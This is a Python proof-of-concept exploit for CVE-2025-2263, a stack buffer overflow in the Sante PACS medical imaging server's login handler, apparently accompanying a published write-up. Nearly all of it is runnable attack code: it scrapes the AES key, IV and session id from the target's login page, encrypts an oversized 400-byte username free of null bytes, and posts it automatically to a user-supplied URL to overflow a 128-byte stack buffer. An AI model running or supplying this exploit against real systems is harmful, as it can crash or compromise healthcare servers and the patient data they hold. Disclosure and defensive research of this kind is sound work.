# Exploit for Sante PACS CVE-2025-2263 Stack Buffer Overflow
# Writeup: https://labs.pwnfuzz.com/posts/sante-pacs-cve-2025-2263-buffer-overflow/
# Author: D4mianwayn
# Vendor: Sante PACS (version < 4.2.0)
# Credits: Tenable Research (www.tenable.com/security/research/tra-2025-08)


BANNER = r"""
__________               ___________                     .____          ___.           
\______   \__  _  ______ \_   _____/_ __________________ |    |   _____ \_ |__   ______
 |     ___/\ \/ \/ /    \ |    __)|  |  \___   /\___   / |    |   \__  \ | __ \ /  ___/
 |    |     \     /   |  \|     \ |  |  //    /  /    /  |    |___ / __ \| \_\ \\___ \ 
 |____|      \/\_/|___|  /\___  / |____//_____ \/_____ \ |_______ (____  /___  /____  >
                       \/     \/              \/      \/         \/    \/    \/     \/ 
   Author: D4mianWayne
"""

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import binascii
import requests
import re
import argparse

def generate_null_byte_free_ciphertext(key_str, iv_str, target_decrypted_length, block_size=16, max_attempts=10000):
    """
    Generates an AES-CBC ciphertext for a plaintext of a specific
    decrypted length, ensuring the final ciphertext contains no null bytes.

    Args:
        key_str (str): The encryption key as a hexadecimal string.
        iv_str (str): The IV (Initialization Vector) as a hexadecimal string.
        target_decrypted_length (int): The desired length of the plaintext
                                       that, when decrypted, will cause the overflow.
                                       This should be > 128 bytes (e.g., 129 bytes).
        block_size (int): AES block size (default 16 bytes).
        max_attempts (int): Maximum number of attempts to generate null-byte-free ciphertext.

    Returns:
        tuple: A tuple containing (plaintext, ciphertext_base64) if successful,
               otherwise (None, None).
    """
    key = binascii.unhexlify(key_str)
    iv = binascii.unhexlify(iv_str)

    if len(key) != 16 and len(key) != 24 and len(key) != 32:
        raise ValueError("Key must be 16, 24, or 32 bytes long (128, 192, or 256 bits).")
    if len(iv) != block_size:
        raise ValueError(f"IV must be {block_size} bytes long for AES CBC.")

    # The ciphertext (the usrname we are sending as 'encrypted') contains more than 128 bytes of data,
    # which overflows a fixed stack-allocated buffer for decrypted data on the server.
    padding_needed = block_size - (target_decrypted_length % block_size)
    if padding_needed == 0:
        padding_needed = block_size
    base_plaintext_length = target_decrypted_length - padding_needed
    if base_plaintext_length <= 0:
        raise ValueError(f"Target decrypted length ({target_decrypted_length}) is too small relative to block size ({block_size}). Needs to be at least {block_size+1} to guarantee overflow after padding.")

    print(f"[*] Targeting plaintext content length: {base_plaintext_length} bytes to achieve a total decrypted length of {target_decrypted_length} bytes (including {padding_needed} bytes of PKCS#7 padding).")

    for attempt in range(max_attempts):
        # Generate a plaintext of the desired length.
        # We use a repeating pattern (e.g., 'A') and append a few random bytes
        # to try and alter the ciphertext to avoid nulls.
        plaintext_base = b'A' * base_plaintext_length
        
        # Add a small random suffix to subtly change the plaintext,
        # hoping to get a null-byte-free ciphertext.
        # The length of this random suffix should not change the *padded* length category.
        # So, we'll try to keep it within a block.
        random_suffix_length = min(block_size, (target_decrypted_length % block_size) or block_size) # Don't overshoot the padding
        
        # Create a small random part that won't change the overall padded length significantly
        # but will vary the actual content being encrypted.
        random_part = bytes([i % 256 for i in range(attempt, attempt + random_suffix_length)]) # Use attempt to vary this
        
        # Ensure the random part doesn't push the effective plaintext content length
        # past what's needed for 'target_decrypted_length' after padding.
        # If random_part makes it too long, truncate it.
        # The key here is that the *final padded plaintext* size is fixed.
        # The random part just alters the *content* that gets padded.
        
        # Adjusting the plaintext length to hit the exact target_decrypted_length
        # after padding.
        # The `pad` function will add `padding_needed` bytes to `plaintext_to_encrypt`.
        # So, `len(plaintext_to_encrypt) + padding_needed` should be `target_decrypted_length`.
        # This means `len(plaintext_to_encrypt)` should be `target_decrypted_length - padding_needed`.
        
        plaintext_to_encrypt = plaintext_base[:-len(random_part)] + random_part if len(plaintext_base) >= len(random_part) else random_part
        plaintext_to_encrypt = plaintext_to_encrypt[:base_plaintext_length] # Ensure exact length

        # Apply PKCS#7 padding
        padded_plaintext = pad(plaintext_to_encrypt, block_size)

        # Encrypt the padded plaintext
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(padded_plaintext)

        # Check for null bytes in the ciphertext
        if b'\x00' not in ciphertext:
            print(f"[+] Found null-byte-free ciphertext after {attempt + 1} attempts!")
            return plaintext_to_encrypt.decode('latin-1'), base64.b64encode(ciphertext).decode('ascii')
        
        if (attempt + 1) % 1000 == 0:
            print(f"[*] Attempt {attempt + 1}: Null byte found in ciphertext. Retrying...")

    print(f"[-] Failed to generate null-byte-free ciphertext after {max_attempts} attempts.")
    return None, None

def return_key_iv_session_id(target_url):
    sess = requests.Session()
    try:
        r = sess.get(f"{target_url}/loginpage")
        if r.status_code == 200:
            html = r.text
            # Extract IV from: CryptoJS.enc.Utf8.parse("iv_string")
            iv_match = re.search(r'CryptoJS\.enc\.Utf8\.parse\(["\']([^"\']+)["\']\)', html)
            iv = iv_match.group(1) if iv_match else None
            if not iv:
                print("[-] Could not find IV in the page JS.")
                return None, None, None
            # Extract URL from: await fetch("url")
            url_match = re.search(r'await fetch\(["\']([^"\']+)["\']\)', html)
            fetch_url = url_match.group(1) if url_match else None
            if not fetch_url:
                print("[-] Could not find fetch URL in the page JS.")
                return None, None, None
            # If the fetch_url is relative, prepend target_url
            if fetch_url.startswith("/"):
                fetch_url = target_url.rstrip("/") + fetch_url
            # Fetch the key/session_id from the extracted URL
            r2 = sess.get(fetch_url)
            # Try to extract key and session_id from JSON or cookies
            key = r2.text
            session_id = fetch_url.split("=")[1]
            if not key or not session_id:
                print("[-] Could not extract key or session_id from fetch response.")
                return None, None, None
            print(f"[+] Extracted IV: {iv}")
            print(f"[+] Extracted key: {key}")
            print(f"[+] Extracted session_id: {session_id}")
            return key, iv, session_id
        else:
            print(f"[-] Failed to connect to loginpage. Status code: {r.status_code}")
            return None, None, None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None, None, None

if __name__ == "__main__":
    print(BANNER)
    parser = argparse.ArgumentParser(description="CVE-2025-2263 stack overflow exploit helper.")
    parser.add_argument("--url", required=True, help="Base URL of the target (e.g., http://target-host)")
    args = parser.parse_args()
    target_url = args.url

    # Fetch key, IV, and session_id from the target
    KEY_RAW, IV_RAW, SESSION_ID = return_key_iv_session_id(target_url)
    
    # Verify lengths
    if not KEY_RAW or not IV_RAW:
        print("[!] Could not retrieve key or IV. Exiting.")
        exit(1)
    if len(KEY_RAW) != 16 or len(IV_RAW) != 16:
        print("[!] Warning: Provided key or IV is not 16 bytes. Please ensure they are correctly obtained and formatted.")
    
    # Convert raw bytes to hex strings for consistency if needed, or directly use bytes
    KEY_HEX = binascii.hexlify(KEY_RAW.encode('latin-1')).decode('ascii')
    IV_HEX = binascii.hexlify(IV_RAW.encode('latin-1')).decode('ascii')

    # --- Set your target overflow length ---
    OVERFLOW_PLAINTEXT_LENGTH = 400
    print("\n--- Generating Malicious Encrypted Username/Password ---")
    print(f"[*] Using Key (hex): {KEY_HEX}")
    print(f"[*] Using IV (hex): {IV_HEX}")
    print(f"[*] Target plaintext length (before padding): {OVERFLOW_PLAINTEXT_LENGTH} bytes")
    print(f"[*] Expected total decrypted bytes (plaintext + padding) on server: {OVERFLOW_PLAINTEXT_LENGTH + (16 - (OVERFLOW_PLAINTEXT_LENGTH % 16) if OVERFLOW_PLAINTEXT_LENGTH % 16 != 0 else 16)} bytes")

    crafted_plaintext, crafted_ciphertext_b64 = generate_null_byte_free_ciphertext(
        KEY_HEX,
        IV_HEX,
        OVERFLOW_PLAINTEXT_LENGTH,
        max_attempts=50000
    )

    if crafted_ciphertext_b64:
        print("\n[+] Successfully crafted null-byte-free ciphertext!")
        print(f"    Plaintext used: {crafted_plaintext}")
        if crafted_plaintext:
            print(f"    Plaintext length: {len(crafted_plaintext.encode('latin-1'))} bytes")
        print(f"    Ciphertext (Base64-encoded): {crafted_ciphertext_b64}")
        print(f"    Ciphertext length (bytes, Base64-decoded): {len(base64.b64decode(crafted_ciphertext_b64))}")
        print(f"Performing the login request with generated ciphertext...")

        # --- AUTOMATIC POST REQUEST ---
        post_url = f"{target_url}/loginpage?system=santesoft+ltd"
        multipart_data = {
            "username": (None, "encrypted"),
            "password": (None, "encrypted"),
            "usrname": (None, crafted_ciphertext_b64),
            "passwrd": (None, "w99fhmX25AOPaV3nDFrJOg=="),
            "session_id": (None, SESSION_ID)
        }
        print(f"\n[+] Sending POST request to {post_url} ...")
        post_response = requests.post(post_url, files=multipart_data)
        print("POST response status:", post_response.status_code)
        print("POST response body:\n", post_response.text)
    else:
        print("\n[-] Could not generate a suitable ciphertext. Try increasing max_attempts or adjusting parameters.")